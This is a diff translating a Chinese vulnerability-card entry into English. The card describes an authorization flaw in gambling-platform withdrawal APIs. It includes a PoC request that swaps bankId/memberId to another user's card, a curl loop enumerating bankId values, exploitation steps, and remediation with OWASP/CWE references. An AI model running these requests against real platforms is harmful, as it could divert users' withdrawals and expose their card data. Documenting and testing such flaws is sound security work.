@@ -1,60 +1,60 @@
 ﻿---
-title: 提现银行卡越权替换（把别人提现收进自己卡）
-cve: 无（业务逻辑）
+title: Unauthorized withdrawal bank-card replacement (redirect others' withdrawals to your own card)
+cve: None (business logic)
 severity: critical
 cvss: 9.3
-product: 自研提现模块（博彩包网）
-versions: 任意
+product: Custom withdrawal modules (turnkey gambling platforms)
+versions: Any
 ports: 80, 443
-keywords: 提现, 银行卡, 越权, 替换, 资金, withdraw
-entry: /api/withdraw/apply 的 bankId / cardNo / memberId
+keywords: withdrawal, bank card, authorization bypass, replacement, funds, withdraw
+entry: bankId / cardNo / memberId in /api/withdraw/apply
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 POST /api/withdraw/apply  {"amount":100,"bankId":12}
-GET  /api/bank/list       → 我的银行卡
+GET  /api/bank/list       → My bank cards
 ```
 
-## 前置条件
+## Prerequisites
 
-- 普通会员；能抓提现申请请求。
+- An ordinary member; ability to capture withdrawal-application requests.
 
 ## PoC
 
 ```http
-### 1) 改 bankId 指向他人卡
+### 1) Change bankId to point to another person's card
 POST /api/withdraw/apply HTTP/1.1
 Authorization: Bearer <token>
 
-{"amount":10,"bankId":<遍历值>,"cardNo":"<自己的卡>","memberId":<他人uid>}
+{"amount":10,"bankId":<enumerated-value>,"cardNo":"<your-own-card>","memberId":<other-user-uid>}
 ```
 
 ```bash
-# 2) 遍历回调看是否被采纳（只读判定）
+# 2) Iterate and inspect returned responses for acceptance (read-only assessment)
 for b in $(seq 1 30); do
   r=$(curl -s -X POST https://target/api/withdraw/apply -H "Authorization: Bearer <t>" \
       -H 'Content-Type: application/json' -d "{\"amount\":1,\"bankId\":$b}")
   echo "$b → $(echo $r | head -c 80)"
 done
-# 判定：出现"卡号尾号 xxxx"且不是你自己的卡 = 命中
+# Confirmation: "card ending xxxx" appears and is not your own card
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先绑一张自己的卡做基线；
-2. 改 bankId/memberId 提交 1 元提现，看回包里的收款卡尾号；
-3. 若显示他人卡 → 资金可被劫持（critical）；
-4. 证据：一次请求 + 回包里的卡尾号（打码）。
+1. First bind your own card as a baseline;
+2. Change bankId/memberId and request a 1-yuan withdrawal; inspect the recipient card's last digits in the response;
+3. If another person's card appears → funds can be hijacked (critical);
+4. Evidence: one request + card-ending digits in the response (redacted).
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 提现只从 token 归属的银行卡表取；bankId 校验属于本人；
-- 提现申请与银行卡改绑都要二次验证（短信/2FA）+ 冷静期。
+- Retrieve withdrawal cards only from records belonging to the token owner; verify bankId ownership;
+- Require secondary verification (SMS/2FA) + a cooling-off period for withdrawal requests and bank-card changes.
 
-## 参考
+## References
 
-- OWASP WSTG-BUSL-01；CWE-639。
+- OWASP WSTG-BUSL-01; CWE-639.
